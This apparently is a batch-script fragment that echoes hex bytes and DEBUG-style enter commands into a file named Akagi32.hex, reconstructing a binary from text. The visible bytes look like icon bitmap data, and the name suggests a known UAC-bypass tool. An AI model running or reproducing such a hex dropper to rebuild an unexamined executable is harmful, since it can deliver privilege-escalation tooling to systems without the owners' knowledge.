echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 28 00 00 00 30 00 00 00 60 00 00 00 01 00 18 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c8 d1 d7 c6 d0 d4 c6 d0 d5 c7 cf d7 c7 cf d7 c7 cf d6 c7 d0 d5 c6 cf d6 c9 cf d6 c9 d0 d4 ce d5 e4 5c 61 88 4a 4d 85 2c 33 53 2d 36 43 30 35 43 32 36 44 38 3e 49 a9 b2 ba ca d4 d8 c8 d2 d8 c8 d1 d7 cb d5 da 9c a6 a9>>Akagi32.hex
echo e b980>>Akagi32.hex
echo ca d5 d7 c7 d2 d4 c8 d3 d4 c7 d2 d4 c7 d2 d7 ca d6 dd 9f a9 b0 c0 cc cf c7 d2 d4 c6 d2 d4 b6 c0 c6 99 a2 aa ab b4 bb bc c5 cd ca d1 da 7b 83 8b 24 2b 39 29 2e 40 33 39 4c 37 3e 50 35 3e 51 90 95 b0 4e 50 80 50 4e 8b c0 c9 cf ca d3 d7 c6 d0 d5 c6 cf d6 c7 cf d6 c7 cf d6 c7 d0 d5 c6 cf d6 c9 cf d6 c8 cf d5 ba c3 d6 4a 4c 80 48 4a 87 2c 32 54 2d 36 43 2f 36 42 33 39 45 43 4b 54 ba c3>>Akagi32.hex
echo e ba00>>Akagi32.hex
echo c9 c9 d3 d7 c8 d2 d6 ca d3 d8 9e a8 ac c8 d3 d5 c6 d1 d3 c8 d3 d5 c8 d3 d4 c7 d2 d5 c5 d1 da c3 cc dc 6c 72 84 bb c5 cd c8 d3 d3 c7 d4 d4 c7 d3 d4 c6 d1 d4 a3 ae af c1 cc cf c5 cd d5 4a 50 5d 28 2d 3f 3a 3f 51 39 3e 4f 2e 36 40 67 76 77 c5 d4 d7 72 7d 98 4c 4d 8a 56 60 65 c6 d0 d4 c6 d0 d4 c6 d0 d4 c7 d1 d4 c7 d1 d4 c7 d1 d4 c6 d1 d4 c9 cf d4 cb d2 d7 8e 97 ae 4d 4d 89 48 49 8b 2c>>Akagi32.hex
echo e ba80>>Akagi32.hex
echo 32 54 2d 36 45 2e 36 43 32 39 44 4c 54 5b c4 ce d2 c8 d2 d6 c9 d3 d7 a3 ad b1 c1 cb cf c7 d1 d4 c7 d3 d5 c7 d3 d5 c7 d3 d5 c7 d2 d4 c8 d1 de 86 89 a7 58 58 7c b0 b5 cb c9 d2 d6 c7 d4 d3 c7 d3 d5 c5 cf d5 9d a8 ac c6 d0 d6 ba c1 ce 2e 33 47 3a 40 57 37 3c 52 2e 33 42 2f 34 3f 9f a9 ae c8 d1 d5 bb c6 d6 4d 54 81 3a 43 4b 74 80 85 c8 d2 d6 c7 d1 d5 c6 d0 d4 c6 d1 d5 c6 d1 d5 c7 d0 d4>>Akagi32.hex
echo e bb00>>Akagi32.hex
echo c8 cf d4 ca d2 da 5b 62 82 4e 4e 8f 48 48 8b 2c 32 55 2d 35 46 2f 37 44 33 3a 45 4f 57 5f c6 cf d5 ca d4 d9 ad b7 bc b5 bf c3 c8 d2 d6 c7 d2 d5 c7 d2 d4 c8 d2 d4 c7 d2 d4 c7 d3 d6 a3 af bf 49 4f 73 52 52 7f a4 a8 c1 c9 d2 d6 c8 d2 d2 c7 d2 d4 c8 d2 d7 93 9c a5 cb d3 e0 a4 a9 bb 42 46 5d 38 3e 53 2b 31 43 2b 32 43 32 36 4c 84 89 9b c9 d0 d6 c7 d1 da 7a 83 a2 34 3e 4c 35 43 4c 83 8f>>Akagi32.hex
echo e bb80>>Akagi32.hex
echo 96 ca d3 d8 c6 d0 d4 c5 d0 d4 c6 d0 d4 c9 d0 d3 c6 d0 d7 ad b7 cb 4a 52 7e 46 48 91 47 48 8a 2d 32 57 2e 37 47 2e 39 44 31 3a 47 4b 54 5e c0 c9 d0 b5 be c6 ae b8 be c9 d3 d7 c6 d1 d6 c5 d0 d8 c7 d1 d6 c8 d1 d5 c8 d3 d5 bb c7 d5 58 65 85 44 4c 7e 49 4e 7f 94 9b b0 ca d3 d6 c7 d2 d4 c7 d2 d5 cb d6 da 8d 96 a1 b6 bb cd 5d 61 75 3d 43 57 2c 32 42 2c 32 40 2a 33 45 31 3a 5a 53 57 7f bc>>Akagi32.hex
echo e bc00>>Akagi32.hex
echo c5 d6 c7 d1 d6 b1 ba ce 30 3b 49 32 40 48 37 44 4a 99 a2 a8 c9 d2 d8 c5 d0 d6 c7 d1 d5 c8 d1 d3 c6 d2 de 80 8a a6 48 4e 86 44 46 93 46 4a 8c 2d 32 58 2f 36 47 2e 39 44 31 3a 47 45 4c 58 b9 c1 c9 a6 af b6 c8 d1 d7 c7 d1 d5 c6 d1 d6 c5 d1 d7 c7 d1 d5 c8 d1 d6 c6 d0 de 78 82 9e 49 53 81 3b 44 77 47 4d 7d 87 8f a5 c8 d4 d6 c7 d2 d4 c7 d2 d4 cc d7 da 96 a2 a9 68 6e 7d 4b 51 63 2d 36 45>>Akagi32.hex
echo e bc80>>Akagi32.hex
echo 2d 34 40 2d 33 40 2b 31 46 34 3d 66 4d 4d 88 88 8e aa c9 d2 d9 c4 cf dc 31 3b 4b 30 3d 45 2e 3b 43 38 41 48 a6 b0 b6 c9 d2 d9 c9 d0 d5 c6 d0 d7 b8 c5 d7 52 5c 83 45 4b 8e 41 45 95 44 4a 8c 2d 33 57 30 38 48 2f 3a 46 30 39 46 3f 47 53 93 9c a3 c4 cd d4 c6 d0 d6 c7 d1 d5 c6 d1 d5 c5 d2 d5 c8 d2 d5 c8 d1 d8 a0 a8 bf 4b 52 7a 45 50 7f 5c 67 97 49 4e 83 7c 83 9c c9 d4 d6 c7 d2 d4 c7 d2>>Akagi32.hex
echo e bd00>>Akagi32.hex
echo d4 c0 cb ce a6 b3 b6 bc c4 cf 6c 73 82 2f 37 45 2e 34 41 2d 33 42 29 2f 46 3a 41 72 4c 4a 8e 56 57 83 bf c5 d9 c7 d0 db 2f 37 55 30 3d 48 31 3d 46 2a 33 3b 3e 45 4c a5 a9 b0 cc d3 d9 ca d1 dd 77 81 9d 4a 52 86 46 4a 91 46 47 90 44 47 82 3b 42 61 31 3b 48 2e 3a 46 30 38 45 38 40 4c a8 b2 b9 c8 d1 d8 c6 cf d5 c7 d1 d5 c3 d1 d5 c4 d2 d5 c6 d1 d7 bd c3 d3 53 5a 7b 4d 57 81 6f 81 a5 8d>>Akagi32.hex
echo e bd80>>Akagi32.hex
echo 9c c7 4a 51 84 76 7d 9b c8 d3 d8 c7 d1 d5 c8 d2 d6 a7 b1 b5 bc c8 cc c6 d0 da 59 60 6e 30 38 45 2e 35 42 30 34 43 2b 30 46 3f 45 74 49 48 8d 4a 4d 88 87 8f b0 bb c6 d5 2c 35 56 30 3e 49 33 3c 49 2b 36 43 23 29 38 40 42 58 7f 82 9f 7d 81 a7 49 4f 87 43 49 91 46 4a 8f 4d 4e 8b 51 52 80 65 6d 85 32 3f 49 2e 3b 47 30 38 46 38 42 4c a8 b4 bb c3 d0 d6 c3 d0 d7 b9 c8 cd ad c2 c4 b1 c1 c6>>Akagi32.hex
echo e be00>>Akagi32.hex
echo b5 bd cc 64 65 85 4a 54 83 39 4b 77 70 86 a8 6d 7f a8 49 52 83 71 7a 99 c6 d3 d9 c7 d0 d6 ca d3 d9 96 9f a6 cd d7 db c6 d1 d9 44 4d 58 2f 3a 44 2f 37 42 32 35 43 3b 40 52 4c 50 7a 46 46 8b 45 48 8f 49 50 82 3c 4a 62 24 2f 47 31 3d 4b 33 3c 4a 31 3d 48 22 2d 3b 23 29 46 44 47 7c 46 48 8f 42 47 95 3d 46 94 44 49 8e 49 49 81 a0 a4 c6 63 6e 7d 35 41 4e 2d 39 47 31 39 48 3b 43 50 ab b5>>Akagi32.hex
echo e be80>>Akagi32.hex
echo be bc c8 cf 98 ab b3 83 9a a4 7f 95 a0 82 93 a1 4f 55 6c 33 34 54 3d 47 68 93 a8 c2 ab c2 dd 7d 91 b7 49 52 83 6e 77 95 c6 d2 d8 c7 d1 d5 cc d3 da 98 a1 a9 c9 d3 d6 bc c4 cd 34 3d 47 2f 3a 43 2f 38 42 31 36 42 4c 52 61 6c 72 95 45 48 88 45 46 92 46 49 8b 28 2f 5a 1e 29 3e 2e 3b 4a 30 3c 4c 32 3e 4a 2c 36 41 1c 26 39 25 2d 51 42 47 80 45 46 8f 43 45 92 48 4a 8d 6d 73 9c c8 d3 e2 63>>Akagi32.hex
echo e bf00>>Akagi32.hex
echo 70 78 37 42 4f 2d 39 47 32 3a 49 3d 45 53 a0 aa b6 8a 97 a2 7e 93 9e 79 90 9e 7e 93 a2 58 6a 7c 26 34 4f 26 33 55 62 73 96 74 8d a9 91 a9 c5 6c 7f a6 4a 53 83 6d 76 94 c5 d2 d8 c5 ce d2 b4 bc c2 af b8 bf c9 d3 db 74 7c 89 35 3c 4c 2f 39 46 2e 36 42 30 36 41 49 50 5c 60 6a 84 41 4a 7e 44 48 8f 44 49 90 3b 42 7a 1e 2a 40 29 37 47 31 3e 4d 33 3d 4d 34 3c 4a 22 2a 3a 1d 24 38 28 2e 4b>>Akagi32.hex
echo e bf80>>Akagi32.hex
echo 42 43 72 4c 49 82 39 3a 68 b7 bd db c8 d2 df 5b 65 70 36 3f 4e 2e 37 46 32 3a 4a 33 41 50 72 86 92 7e 96 9f 7c 93 9f 80 95 a1 6c 7a 8d 27 34 4c 21 31 4f 52 64 8c 6a 83 ad 69 84 ab 63 7c a3 59 6b 96 49 51 79 70 78 95 c8 d0 dc cb d4 d5 9b a5 a5 c9 d2 d8 ae b4 d0 43 48 6a 2e 33 4e 2f 37 47 2e 36 44 2e 36 43 2b 32 40 24 2f 47 35 3e 68 44 49 8c 43 48 92 45 49 8e 1c 2a 41 22 30 40 32 3e>>Akagi32.hex
echo e c000>>Akagi32.hex
echo 4d 34 3d 4e 35 3e 4c 2c 32 40 21 26 31 1f 24 31 1f 27 35 21 2a 36 23 2e 34 41 50 51 9b a6 ac 51 5a 65 35 3e 4d 2f 37 47 33 3b 4b 31 3e 4d 68 7c 8a 7d 94 a1 7e 93 a2 77 8a 98 2c 3b 4f 24 32 4e 44 57 79 6f 86 ad 65 82 ad 66 84 ac 59 76 9b 5f 73 97 33 3e 5f 62 6e 82 c7 d1 d9 c7 d2 d4 9b a9 ad c3 ce de 62 65 8d 47 49 79 2d 33 4e 30 38 47 2e 36 44 2e 36 44 2a 32 40 21 2f 44 24 30 53 41>>Akagi32.hex
echo e c080>>Akagi32.hex
echo 4a 85 3f 48 90 43 45 92 19 2a 3f 22 31 41 32 3d 4d 36 3e 4f 34 3e 4f 2f 3a 48 20 27 34 1f 25 30 1f 28 30 23 2b 34 1f 27 33 20 2c 34 3a 43 4f 53 5c 6a 36 3e 4d 30 37 47 34 3c 4c 32 3c 4c 64 77 84 7d 92 9f 7f 8f a0 3f 4b 5e 29 34 4e 36 44 66 6d 82 a8 68 82 ab 63 83 aa 62 83 aa 5d 7b a0 57 6d 8f 2b 39 58 48 55 6b aa b3 c0 9f a7 b1 bd c6 d4 7c 83 9d 46 4a 76 31 37 5d 2e 36 48 2e 37 46>>Akagi32.hex
echo e c100>>Akagi32.hex
echo 2e 37 47 2d 36 44 28 33 40 20 2f 41 1d 2a 47 34 3e 6f 42 47 90 42 46 94 19 29 40 22 31 45 2e 3a 4c 34 3f 51 33 3e 51 34 3e 4e 23 2c 38 1e 26 30 1d 26 2f 22 2a 34 21 28 34 1e 27 31 20 29 35 2e 36 45 35 3c 4e 31 39 4a 35 3e 4e 31 3d 4c 64 73 80 83 93 a2 58 66 7d 27 35 50 29 3b 5c 67 7e a4 66 81 a9 66 82 ab 63 84 ab 63 83 aa 63 81 a5 50 67 87 2a 3a 56 4f 5c 71 8f 98 a5 6f 76 7e 5f 65>>Akagi32.hex
echo e c180>>Akagi32.hex
echo 6d 2d 33 40 22 2c 3c 20 2a 39 31 38 46 2f 37 47 2f 38 48 2c 37 45 29 34 43 22 2f 41 1f 2e 44 20 2b 4d 40 46 7b 46 49 8a 18 27 40 21 30 48 2a 38 4d 33 3e 52 34 3f 52 37 41 51 2c 34 42 1f 26 33 1f 28 32 21 29 35 21 28 34 1f 26 2f 1f 27 33 31 38 47 36 3c 50 31 3b 4d 34 3e 50 2f 3e 4c 61 72 7f 67 75 88 29 35 51 26 36 57 5d 73 99 67 84 ab 64 83 ab 64 83 ab 61 84 a9 63 84 a9 67 84 a9 44>>Akagi32.hex
echo e c200>>Akagi32.hex
echo 5a 79 27 35 50 65 6f 86 4f 58 68 25 2b 39 22 28 35 20 28 32 1e 27 30 20 27 34 32 39 46 2f 37 47 2f 39 48 2b 37 45 2c 35 44 24 2f 41 1e 2e 44 1b 2a 3f 1d 28 42 26 32 4d 18 27 40 21 30 48 2a 38 4e 32 3e 51 34 40 51 36 41 50 32 3b 49 21 28 36 29 32 3e 21 28 35 22 29 36 20 28 31 21 28 34 34 3a 49 36 3d 50 31 3b 4d 34 3e 50 33 3c 4f 48 54 66 2b 38 4f 25 33 51 54 68 8b 6a 83 aa 65 83 ac>>Akagi32.hex
echo e c280>>Akagi32.hex
echo 64 82 ab 64 82 ab 63 83 aa 63 83 a9 6a 85 aa 58 6c 8b 45 52 6c 59 63 78 22 2a 39 21 28 35 1f 26 32 20 28 31 1f 28 30 21 28 33 33 3a 47 31 39 48 30 3a 49 2c 38 46 2c 35 45 24 2f 42 1f 2f 45 1b 2a 3e 18 25 38 1e 2d 41 17 26 3f 21 31 4a 2b 3a 51 2d 3a 4f 34 41 52 34 41 4f 36 40 50 24 2c 3b 2e 36 44 24 2a 39 23 2a 37 21 28 32 21 29 34 37 3d 4c 36 3d 50 31 3b 4d 34 3e 50 35 3c 51 2b 32>>Akagi32.hex
echo e c300>>Akagi32.hex
echo 49 24 2f 4b 46 56 74 6e 86 a8 67 83 aa 65 83 ab 63 83 ab 64 83 ab 65 85 ad 64 81 a3 68 7f 9d 81 93 ab 8e 9b af 51 5c 6e 24 2e 3c 22 29 36 21 29 35 1f 28 31 1f 28 30 21 29 33 34 3c 47 32 3a 49 30 3a 49 2d 38 46 2d 37 45 25 2f 43 1f 30 45 1b 2a 40 18 26 39 1c 2d 40 17 27 40 20 30 49 27 3b 51 29 39 50 33 41 53 31 3f 4d 37 42 51 2b 34 44 2c 35 48 27 2e 40 22 2b 38 20 29 32 22 2a 34 38>>Akagi32.hex
echo e c380>>Akagi32.hex
echo 3e 4e 36 3f 50 31 3d 4d 35 3f 50 36 3e 50 2a 31 46 34 41 5c 6c 81 a4 68 83 ab 64 83 ac 62 84 ac 65 86 aa 62 7f a1 60 78 97 8c 9f b8 ad be d1 b5 c6 d7 b6 c5 d6 b6 c4 d5 94 a0 af 45 4f 5e 24 2e 3b 20 2a 38 20 26 34 21 2a 36 33 3b 48 32 3b 4a 31 3b 4b 2d 38 46 2d 38 48 23 30 44 1f 2f 46 1a 2b 40 18 27 3b 1d 2d 3f 18 28 42 20 30 47 25 3b 52 25 39 50 30 40 53 30 3f 4c 37 42 50 31 3b 4b>>Akagi32.hex
echo e c400>>Akagi32.hex
echo 28 33 46 2a 34 45 20 2b 38 21 2a 34 25 2c 37 38 41 4f 35 40 4f 33 40 4f 34 41 4f 35 3f 4f 26 2e 3e 30 3d 56 6c 82 a5 67 84 ad 64 84 ad 68 86 ac 6f 88 a9 73 88 a5 a9 b9 cf b5 c5 d5 b4 c4 d4 b4 c4 d3 b4 c4 d3 b5 c4 d4 b8 c6 d6 b3 c1 d0 76 83 92 2b 37 46 22 2b 3b 23 2c 39 32 3b 48 33 3c 4a 31 3c 4c 2c 38 47 2d 39 4a 23 31 45 1e 30 45 1a 2c 41 18 27 3b 1e 2e 3f 1a 2a 43 20 31 48 26 3b>>Akagi32.hex
echo e c480>>Akagi32.hex
echo 52 26 38 53 2b 3c 51 30 3e 4d 36 42 51 35 41 51 29 34 46 30 3a 4b 20 2a 38 22 2a 36 28 2f 3b 38 41 4f 36 41 50 34 41 4f 34 41 4f 33 3e 4c 23 2c 3b 24 31 47 6a 7f a0 67 84 ab 69 85 ac 70 88 ab 8b 9c ba ae bf d7 b4 c4 d5 b4 c4 d2 b5 c4 d4 b5 c4 d3 b4 c4 d3 b4 c4 d4 b3 c4 d6 b5 c4 d5 b7 c5 d6 8f 9d ac 34 3c 4c 22 2e 3a 34 3d 4b 35 3d 4c 31 3c 4c 2d 3a 49 2f 3b 4c 24 32 46 20 31 46 1b>>Akagi32.hex
echo e c500>>Akagi32.hex
echo 2d 42 18 27 3b 1f 2f 41 19 29 42 21 32 49 25 3b 52 27 39 54 29 39 51 2f 3c 50 37 43 55 38 44 55 2d 38 4c 33 3e 4f 1e 2a 38 22 2b 37 2d 34 41 38 41 50 37 41 52 36 41 52 36 42 53 35 3f 4e 24 2c 3d 1e 2d 45 4d 65 86 66 80 a6 70 88 ab 8f a1 be b1 c2 d9 b2 c4 d5 b3 c4 d1 b3 c4 d1 b5 c4 d3 b5 c4 d3 b4 c5 d4 b5 c5 d5 b3 c4 d6 b4 c4 d6 b4 c4 d5 b7 c4 d3 a9 b4 c4 4a 56 63 33 3d 4b 35 3e 4d>>Akagi32.hex
echo e c580>>Akagi32.hex
echo 32 3d 4d 30 3d 4b 2f 3c 4d 24 33 46 20 32 47 1b 2d 42 19 27 3c 20 30 42 18 28 40 21 31 49 25 39 52 26 39 55 29 39 53 30 3b 51 38 44 57 38 46 55 32 3f 51 37 43 51 21 2e 39 21 2c 35 31 38 47 39 42 53 38 42 54 38 42 54 37 42 54 33 3d 4e 22 2b 44 34 44 65 63 7f a3 6d 89 a9 8f a5 c0 b2 c3 d6 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 af bf ce b1 c1 d0 b9 c9 d8 b4 c3 d2 b5 c3 d2 b5 c3>>Akagi32.hex
echo e c600>>Akagi32.hex
echo d2 b5 c3 d2 b7 c4 d3 b6 c4 d2 5e 6a 79 37 43 52 32 3f 4f 32 3e 4d 2f 3c 4b 26 34 45 21 33 45 1c 2e 41 19 27 3d 22 30 46 18 28 3f 21 31 48 24 39 52 26 39 55 28 39 52 2e 3b 51 39 45 58 37 45 54 37 44 55 37 44 53 26 32 3d 21 2b 34 33 3c 49 3a 42 54 38 42 55 38 42 54 37 42 55 2d 3b 53 42 52 73 6f 83 a4 73 89 a8 93 a7 c1 b1 c3 d6 b3 c4 d5 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b0>>Akagi32.hex
echo e c680>>Akagi32.hex
echo c0 cf 9a aa b9 b7 c7 d6 b5 c4 d3 b5 c3 d2 b5 c3 d2 b5 c3 d2 b5 c3 d2 b5 c4 d3 b3 c2 d1 4f 5d 6c 35 42 53 30 3b 4b 31 3d 4c 27 35 45 21 33 45 1c 2e 41 1a 27 3d 22 30 46 18 28 3f 21 31 48 24 39 52 25 39 55 27 38 51 2f 3c 52 39 44 57 37 45 55 37 44 56 39 45 54 2b 35 42 21 2a 35 33 3c 49 3a 42 54 39 43 55 39 43 55 39 44 57 3d 4c 68 6a 83 aa 72 8a ae a1 b1 ce b4 c5 da b2 c4 d5 b3 c4 d4>>Akagi32.hex
echo e c700>>Akagi32.hex
echo b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b7 c7 d6 80 90 9f 9a aa b9 b4 c3 d2 b5 c3 d2 b5 c3 d2 b6 c4 d3 b5 c3 d2 b3 c4 d3 b7 c6 d5 9b a9 b8 3a 46 55 31 3b 4a 30 3a 4a 28 36 46 22 34 46 1f 30 43 1a 27 3d 21 30 45 19 29 40 21 31 48 26 39 52 24 3b 54 27 39 52 30 3d 55 39 45 59 38 45 57 39 45 57 3a 46 57 2f 38 46 20 29 37 34 3e 4e 3a 43 56 3a 43 56 3a 44 56 35 40 56 44 56 6f 79 90>>Akagi32.hex
echo e c780>>Akagi32.hex
echo a9 a4 b7 ce b3 c3 d7 b2 c3 d4 b2 c3 d3 b3 c3 d3 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b4 c4 d3 a9 b9 c8 b6 c6 d5 b4 c3 d2 b4 c4 d3 b4 c4 d3 b4 c4 d3 b4 c4 d3 b4 c3 d2 b5 c3 d3 b7 c5 d4 63 6f 7f 30 3b 4a 2d 38 48 2b 38 4a 24 35 48 1e 30 44 1a 2a 40 21 33 46 19 29 40 20 31 48 25 39 51 24 3b 52 26 3a 53 32 40 58 39 46 59 38 45 57 39 45 57 3a 45 59 2e 3a 4a 22 2c 3b 37 43 55 38>>Akagi32.hex
echo e c800>>Akagi32.hex
echo 45 57 3a 45 55 3b 44 56 2a 36 4b 50 61 75 a8 b9 cb b4 c3 d5 b3 c3 d4 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b4 c4 d3 b3 c4 d3 b6 c4 d3 b5 c3 d2 b3 c5 d4 89 96 a8 2f 3c 4b 2a 34 46 2e 3b 4d 25 36 49 1d 2f 44 19 2b 40 21 34 46 19 28 40 21 31 4a 25 3a 54 23 3a 54 25 3a 53 32 40 58 3a 46 5b 39 46 58>>Akagi32.hex
echo e c880>>Akagi32.hex
echo 39 46 58 3a 46 5a 2e 3b 4e 21 2e 40 39 46 58 38 45 58 3a 46 56 30 3a 49 23 30 40 76 87 98 b5 c5 d7 b3 c3 d4 b3 c3 d4 b3 c3 d2 b2 c3 d2 b3 c3 d2 b2 c4 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b2 c2 d1 b3 c3 d2 b3 c3 d2 b3 c4 d3 b6 c4 d3 b5 c3 d2 b3 c5 d3 96 a4 b6 2d 39 48 2a 31 42 31 3c 4f 26 37 49 1d 2f 44 19 2b 40 21 34 48 1a 29 42 21 32 4a 25 3a>>Akagi32.hex
echo e c900>>Akagi32.hex
echo 54 23 3a 54 26 3a 53 32 40 57 3b 47 5b 3a 47 59 3a 47 59 3a 47 5b 2f 3d 53 53 61 76 38 46 58 38 48 59 34 41 4f 23 2e 3c 27 34 42 84 94 a3 b5 c4 d5 b3 c3 d4 b3 c3 d4 b3 c3 d2 b2 c3 d2 b3 c3 d2 b2 c4 d2 b3 c4 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b4 c4 d3 95 a5 b4 af bf ce b3 c3 d2 b3 c3 d3 b6 c3 d3 b5 c3 d2 b2 c4 d3 9f ad bf 2b 36 44 28 30 3e 33 3d 4e 29 37 49 1e>>Akagi32.hex
echo e c980>>Akagi32.hex
echo 2f 44 1a 2b 40 21 34 49 1f 2a 43 23 32 4b 28 3c 54 25 3b 56 29 3b 55 33 41 57 3b 48 5b 3b 48 5a 3b 48 5b 3a 48 5c 4d 5f 78 5c 6c 88 38 46 5e 34 42 56 23 2f 3f 24 2f 3b 29 36 43 8c 9a a7 b6 c4 d3 b6 c4 d4 b6 c4 d3 b6 c4 d3 b4 c4 d3 b4 c4 d3 b4 c4 d3 b4 c4 d3 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 ad bd cc b4 c4 d2 b3 c3 d2 b3 c3 d2 b6 c3 d2 b5 c3 d1 b4 c5 d2>>Akagi32.hex
echo e ca00>>Akagi32.hex
echo ab b8 c8 32 3d 4b 25 2e 3a 2c 36 45 29 36 47 21 30 44 1b 2b 40 21 33 4a 1f 2a 43 22 32 4b 29 3c 54 26 3c 56 29 3a 54 34 42 57 3b 48 5b 39 49 5a 3b 47 5c 38 46 5e 62 77 91 51 61 7e 3a 47 5f 25 32 43 20 2c 39 24 30 3a 2a 37 42 90 9d ab b7 c4 d4 ba c7 d6 bc c8 d8 b9 c7 d6 b8 c7 d6 b5 c5 d4 b5 c5 d4 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3 c3 d2 b4 c4 d2 b3 c3 d2 b3 c3 d3 b3 c4>>Akagi32.hex
echo e ca80>>Akagi32.hex
echo d2 b3 c3 d2 b3 c3 d1 b4 c3 d1 b5 c4 d3 b8 c8 d6 b6 c3 d1 40 4a 58 23 2d 39 21 2c 39 25 32 41 23 30 43 1b 2c 41 21 34 4b 1f 2a 43 22 32 4a 28 3b 53 26 3b 56 28 39 53 35 42 59 3c 49 5c 3c 49 5b 3c 48 5c 37 45 5b 65 78 94 43 53 6e 2e 39 4e 22 2d 3b 23 2b 38 24 2e 38 29 37 42 92 a0 af b4 c1 d4 b6 c2 d2 ba c4 d3 ab b7 c6 73 81 90 6d 7d 8c 8a 9a a9 b5 c5 d4 b3 c3 d2 b3 c3 d2 b3 c3 d2 b3>>Akagi32.hex
echo e cb00>>Akagi32.hex
echo c3 d2 b3 c3 d4 b4 c4 d4 b4 c4 d4 b3 c3 d3 b3 c3 d2 b3 c3 d2 b7 c4 d5 b0 bd ce b2 c2 d3 b7 c6 d5 b9 c5 d4 53 5c 6a 24 2c 3a 24 2c 3b 25 30 41 24 31 45 1a 2b 3f 22 35 4b 1f 2a 43 22 32 4a 28 3b 54 25 3a 55 28 38 51 36 43 5a 3d 49 5e 3c 49 5d 3c 48 5d 3a 47 5d 5b 6b 83 31 3f 57 24 30 43 23 2d 3b 24 2b 37 24 2e 38 2b 37 44 92 9f b0 b5 c3 d4 b1 c2 d0 aa bc c9 6b 7e 8b 73 86 94 89 9d aa>>Akagi32.hex
echo e cb80>>Akagi32.hex
echo 5e 71 7f b6 c8 d6 b3 c3 d2 b4 c3 d2 b3 c3 d2 b3 c3 d4 b3 c3 d4 b3 c3 d4 b3 c3 d4 b4 c3 d3 b4 c3 d3 b2 c3 d2 9a aa bd 68 79 8a 78 89 98 b9 c7 d6 ba c5 d6 73 7b 8c 25 2d 3d 23 2b 3a 23 2d 3c 25 31 43 1c 2c 40 23 36 4c 1e 2c 43 22 32 49 29 39 55 26 3a 55 28 3a 52 38 46 5b 3d 4a 5d 3d 4a 5d 3d 49 5f 3e 49 60 3c 49 5b 25 33 42 22 2f 3c 25 2e 3b 24 2c 38 24 2e 3a 2b 37 44 90 9b ac b1 bc>>Akagi32.hex
echo e cc00>>Akagi32.hex
echo cb b9 c5 cf 8a 99 a2 58 6e 79 42 5f 6a 45 61 6d 67 80 8c a2 b6 c3 b3 c5 d2 b5 c4 d1 b4 c3 d2 b2 c2 d5 b3 c2 d6 b3 c3 d4 b4 c3 d4 b4 c2 d5 b3 c4 d5 b3 c6 d8 73 87 99 6b 83 91 79 8e 9a b3 c0 cd b9 c2 d4 9c a6 b9 29 33 45 23 2d 3d 21 2b 38 25 2f 3d 21 2e 3f 26 37 4c 1c 2c 43 22 32 4a 29 39 54 26 3a 54 29 3a 52 38 46 5b 3d 4b 5d 3d 4b 5d 3d 4a 5f 3e 4a 5f 37 44 54 22 2f 3d 21 2e 3b 24>>Akagi32.hex
echo e cc80>>Akagi32.hex
echo 2c 3a 22 2b 39 22 2e 3b 28 35 43 8c 98 a7 72 7c 87 84 8c 94 c2 cb d3 92 a1 ac 35 4c 58 32 49 56 5c 72 80 8f a0 ad b8 c5 d3 b7 c4 d2 b4 c3 d5 b4 c5 d8 b5 c4 d8 b2 c3 d4 b3 c3 d4 b3 c3 d4 b4 c6 d5 aa be cd 48 5c 6b 42 57 64 5f 73 7e 98 a5 b3 a6 b0 c3 ab b6 cc 3c 48 5c 24 30 40 21 2b 38 21 2a 38 20 2e 3f 26 36 4b 1c 2c 43 24 34 4c 29 39 54 26 3a 54 2a 3b 53 39 48 5d 3f 4c 5f 3e 4b 5e>>Akagi32.hex
echo e cd00>>Akagi32.hex
echo 3e 4a 60 3f 4b 60 32 3e 4e 22 2f 3e 21 2e 3b 21 2b 3a 22 2d 3a 25 32 41 26 35 43 83 96 a4 59 67 72 45 4d 55 92 9a a2 a5 b0 ba 30 3e 4b 2c 3f 4b 40 52 60 7f 8c 9d b9 c4 d5 b8 c3 d7 a7 b7 ce 8f a0 b6 a2 b1 c6 63 73 85 b0 c2 d3 b4 c3 d3 b6 c3 d1 b0 bc cc aa bb c6 33 48 52 37 4a 53 78 86 95 71 7d 93 69 77 8e 5a 67 7b 24 32 41 23 2d 3a 21 2a 36 22 2e 3e 28 38 4b 1c 2d 45 23 34 4b 27 3b>>Akagi32.hex
echo e cd80>>Akagi32.hex
echo 54 26 3b 55 29 3b 53 3b 49 5e 3f 4c 5f 3f 4c 5f 3e 4b 5f 3f 4c 61 2e 39 4b 24 30 40 2d 37 48 23 2d 3c 28 36 43 35 41 53 22 31 42 71 83 96 69 78 8d 3e 49 5b 38 43 52 39 46 54 36 44 4f 3b 48 54 7f 8d 9c 67 75 88 a9 b7 d5 8b 9c c4 71 87 ae 6d 7d 9d 37 43 55 2c 3a 49 8f a1 b0 b1 c0 d1 a9 b6 c7 69 77 89 42 54 64 27 37 46 60 6e 7b 4b 54 66 43 50 69 7c 8d a7 66 76 8c 24 31 41 23 2e 3b 21>>Akagi32.hex
echo e ce00>>Akagi32.hex
